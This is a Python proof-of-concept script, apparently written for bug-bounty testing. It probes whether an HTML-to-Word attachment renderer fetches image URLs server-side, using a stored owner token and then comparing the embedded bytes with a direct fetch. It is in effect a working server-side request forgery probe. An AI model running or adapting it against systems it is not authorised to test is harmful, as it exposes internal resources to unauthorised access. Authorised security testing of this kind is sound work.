import json,subprocess,os,uuid,zipfile,io,hashlib
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_OWNER').read().strip()
atype='150'
def render(html,name):
    body={"html":html,"type":"word","attachableType":"AuditableEntity",
          "attachableId":atype,"fileName":name}
    cmd=['curl','-s','-m','120','-o','/tmp/b','-w','%{http_code}','-X','POST',
         H+'/api/v1/attachments/html',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    try: return c,json.loads(open('/tmp/b',encoding='utf-8',errors='replace').read())
    except: return c,None
def get(p):
    cmd=['curl','-s','-m','30',H+p,'-H','token: '+TOK,'-H',BB]
    return json.loads(subprocess.run(cmd,capture_output=True,text=True).stdout)
tag='ZXCMP'+uuid.uuid4().hex[:6]
c,d=render(f'<h1>ZX</h1><img src="https://bugbounty1.qe.optrostaging.ai/login.ico">', f'zx-{tag}')
aid=d['attachmentId']
a=get(f'/api/v1/attachments/{aid}')['attachments'][0]
f=get(f"/api/v1/files/{a['file_id']}")['files'][0]
subprocess.run(['curl','-s','-m','60','-o','/tmp/cmp.docx',f['url']])
z=zipfile.ZipFile(io.BytesIO(open('/tmp/cmp.docx','rb').read()))
embedded=z.read('media/image.ico')
print(f"=== embedded bytes from the renderer ===")
print(f"  length : {len(embedded)}")
print(f"  sha256 : {hashlib.sha256(embedded).hexdigest()}")
print(f"  head   : {embedded[:80]!r}")
print(f"  tail   : {embedded[-80:]!r}")
print()
# direct fetch, same URL, no auth (server-side fetch is unauthenticated)
subprocess.run(['curl','-s','-m','30','-o','/tmp/direct.html','-w','%{http_code}','-H','Host: bugbounty1.qe.optrostaging.ai',
                'https://bugbounty1.qe.optrostaging.ai/login.ico'])
direct=open('/tmp/direct.html','rb').read()
print(f"=== direct fetch of the same URL (my machine) ===")
print(f"  length : {len(direct)}")
print(f"  sha256 : {hashlib.sha256(direct).hexdigest()}")
print(f"  head   : {direct[:80]!r}")
print()
print(f"=== comparison ===")
print(f"  identical bytes: {embedded==direct}")
print(f"  embedded is HTML: {b'<!doctype html' in embedded.lower()}")
print(f"  embedded contains app title: {b'<title>' in embedded.lower()}")
# extract title
import re
m=re.search(rb'<title>(.*?)</title>', embedded, re.I|re.S)
print(f"  title in embedded: {m.group(1)[:60] if m else None}")
